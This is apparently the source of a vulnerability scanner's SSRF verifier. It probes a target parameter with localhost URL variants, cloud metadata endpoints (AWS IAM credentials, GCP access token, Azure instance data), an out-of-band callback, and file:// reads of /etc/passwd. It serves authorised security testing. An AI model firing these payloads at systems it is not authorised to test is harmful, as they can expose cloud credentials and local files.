#!/usr/bin/env python3
"""
SSRF Verifier
=============
Multi-stage:
  Stage 1: Internal IP access
  Stage 2: Cloud metadata endpoints (AWS/GCP/Azure)
  Stage 3: OAST callback (blind SSRF)
  Stage 4: file:// protocol
"""
import re
import time

from ..base_verifier import BaseVerifier
from ..models import VerifiedFinding, VerificationEvidence


class SSRFVerifier(BaseVerifier):
    VULN_TYPE = "SSRF"
    VULN_TITLE = "Server-Side Request Forgery"
    DEFAULT_SEVERITY = "high"
    DEFAULT_CWE = "CWE-918"
    DEFAULT_CVSS = 7.5
    DEFAULT_CVSS_VECTOR = "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N"
    DEFAULT_REMEDIATION = (
        "Validate and allowlist destination URLs. Block internal IP ranges "
        "(127.0.0.0/8, 10.0.0.0/8, 169.254.0.0/16, etc.). Disable "
        "unnecessary URL schemes (file://, gopher://). Use a proxy that "
        "enforces allowlists."
    )

    INTERNAL_TARGETS = [
        ("http://127.0.0.1/", [
            (r"<title>.*?</title>", "Localhost page title"),
            (r"(Apache|nginx|IIS)", "Web server signature"),
        ]),
        ("http://localhost/", [(r"<title>", "Localhost page")]),
        ("http://[::1]/", [(r"<title>", "IPv6 localhost page")]),
        ("http://0.0.0.0/", [(r"<title>", "0.0.0.0 page")]),
        ("http://127.1/", [(r"<title>", "Short-form localhost")]),
        ("http://2130706433/", [(r"<title>", "Decimal localhost")]),
    ]

    CLOUD_METADATA = [
        ("http://169.254.169.254/latest/meta-data/", [
            (r"ami-id", "AWS AMI ID"),
            (r"instance-id", "AWS instance ID"),
            (r"hostname", "AWS hostname"),
        ]),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         [(r"AccessKeyId|SecretAccessKey|Token", "AWS IAM credentials")]),
        ("http://169.254.169.254/latest/user-data",
         [(r".{10,}", "AWS user data")]),
        ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
         [(r"access_token|expires_in", "GCP access token")]),
        ("http://metadata.google.internal/computeMetadata/v1/project/project-id",
         [(r".{3,}", "GCP project ID")]),
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
         [(r"compute|network", "Azure instance metadata")]),
    ]

    FILE_TARGETS = [
        ("file:///etc/passwd", [(r"root:.*?:0:0:", "Local file via file://")]),
        ("file:///c:/windows/win.ini",
         [(r"\[fonts\]", "Windows file via file://")]),
    ]

    def __init__(self, http_client, config=None):
        super().__init__(http_client, config)
        self.oast = (config or {}).get("_oast")

    def verify(self, url, param, method="GET", form_data=None):
        self.steps = []
        all_evidence = []
        extracted_info = {}
        key_exchange = None
        confidence = 0.0

        # ── Stage 1: Internal access ─────────────────────────────────────
        step = self.start_step(
            "internal_access",
            "Testing access to internal IPs",
            stage="detection",
        )
        found = False
        for target, patterns in self.INTERNAL_TARGETS:
            ex = self.inject(url, param, target, method, form_data)
            if not ex or ex.response_status == 0:
                continue
            for pattern, desc in patterns:
                m = re.search(pattern, ex.response_body or "", re.I | re.S)
                if m:
                    ev = VerificationEvidence(
                        type="internal_access",
                        title="Internal resource accessed",
                        description=f"{desc} — {target}",
                        payload=target,
                        extracted_data={
                            "target": target,
                            "match": m.group(0)[:300],
                        },
                        exchange=ex,
                        confidence=0.9,
                    )
                    all_evidence.append(ev)
                    extracted_info["internal"] = {
                        "target": target,
                        "content": m.group(0)[:300],
                    }
                    self.finish_step(step, "passed", payload=target,
                                    details=f"Accessed {target}",
                                    evidence=[ev])
                    confidence = 0.9
                    key_exchange = ex
                    found = True
                    break
            if found:
                break
        if not found:
            self.finish_step(step, "failed",
                            details="No internal access detected")

        # ── Stage 2: Cloud metadata ──────────────────────────────────────
        if confidence < 0.9:
            step = self.start_step(
                "cloud_metadata",
                "Testing cloud metadata endpoints",
                stage="detection",
            )
            for target, patterns in self.CLOUD_METADATA:
                ex = self.inject(url, param, target, method, form_data)
                if not ex or ex.response_status == 0:
                    continue
                for pattern, desc in patterns:
                    m = re.search(pattern, ex.response_body or "", re.I | re.S)
                    if m and len(m.group(0)) > 3:
                        ev = VerificationEvidence(
                            type="cloud_metadata",
                            title="Cloud metadata accessible",
                            description=desc,
                            payload=target,
                            extracted_data={
                                "endpoint": target,
                                "data": m.group(0)[:500],
                            },
                            exchange=ex,
                            confidence=0.95,
                        )
                        all_evidence.append(ev)
                        extracted_info["cloud"] = {
                            "provider": target.split("//")[1].split("/")[0],
                            "data": m.group(0)[:500],
                        }
                        self.finish_step(
                            step, "passed", payload=target,
                            details=f"Cloud metadata: {desc}",
                            evidence=[ev],
                        )
                        confidence = 0.95
                        if not key_exchange:
                            key_exchange = ex
                        break
                if confidence >= 0.9:
                    break
            if confidence < 0.9:
                self.finish_step(step, "failed",
                                details="No cloud metadata access")

        # ── Stage 3: OAST callback (blind SSRF) ──────────────────────────
        if confidence < 0.9 and self.oast:
            step = self.start_step(
                "oast_callback",
                "Testing via out-of-band callback",
                stage="detection",
            )
            try:
                token = self.oast.generate_token()
                oast_url = self.oast.get_url(token)
                ex = self.inject(url, param, oast_url, method, form_data)
                interactions = self.oast.poll(token, timeout=10)
                if interactions:
                    ev = VerificationEvidence(
                        type="oast_callback",
                        title="Out-of-band SSRF callback received",
                        description=(
                            f"Target server made a request to our OAST "
                            f"server from {interactions[0].get('source_ip')}"
                        ),
                        payload=oast_url,
                        extracted_data={
                            "source_ip": interactions[0].get('source_ip'),
                            "user_agent": interactions[0].get('user_agent', ''),
                            "interaction_count": len(interactions),
                        },
                        exchange=ex,
                        confidence=0.98,
                    )
                    all_evidence.append(ev)
                    extracted_info["oast"] = {
                        "source_ip": interactions[0].get('source_ip'),
                        "interactions": len(interactions),
                    }
                    self.finish_step(
                        step, "passed", payload=oast_url,
                        details=f"OAST callback from "
                               f"{interactions[0].get('source_ip')}",
                        evidence=[ev],
                    )
                    confidence = 0.98
                    if not key_exchange:
                        key_exchange = ex
                else:
                    self.finish_step(step, "failed",
                                    details="No OAST callback received")
            except Exception as e:
                self.finish_step(step, "error", details=str(e))

        # ── Stage 4: file:// protocol ────────────────────────────────────
        if confidence < 0.9:
            step = self.start_step(
                "file_protocol",
                "Testing file:// protocol",
                stage="detection",
            )
            for target, patterns in self.FILE_TARGETS:
                ex = self.inject(url, param, target, method, form_data)
                if not ex or ex.response_status == 0:
                    continue
                for pattern, desc in patterns:
                    m = re.search(pattern, ex.response_body or "", re.I)
                    if m:
                        ev = VerificationEvidence(
                            type="file_protocol",
                            title="Local file read via file://",
                            description=desc,
                            payload=target,
                            extracted_data={
                                "file": target,
                                "content": m.group(0)[:300],
                            },
                            exchange=ex,
                            confidence=0.92,
                        )
                        all_evidence.append(ev)
                        extracted_info["file"] = m.group(0)[:300]
                        self.finish_step(step, "passed", payload=target,
                                        details=f"Read {target}",
                                        evidence=[ev])
                        confidence = 0.92
                        if not key_exchange:
                            key_exchange = ex
                        break
                if confidence >= 0.9:
                    break

        # ── Final ────────────────────────────────────────────────────────
        if confidence >= 0.85:
            methods = [s.name for s in self.steps if s.status == "passed"]
            sev = ("critical" if "cloud" in extracted_info or
                  "internal" in extracted_info else "high")
            return self.build_finding(
                url=url, param=param,
                confidence=confidence,
                description=f"SSRF verified. Accessed: {extracted_info}",
                methods=methods,
                extracted_info=extracted_info,
                key_exchange=key_exchange,
                severity=sev,
            )
        return None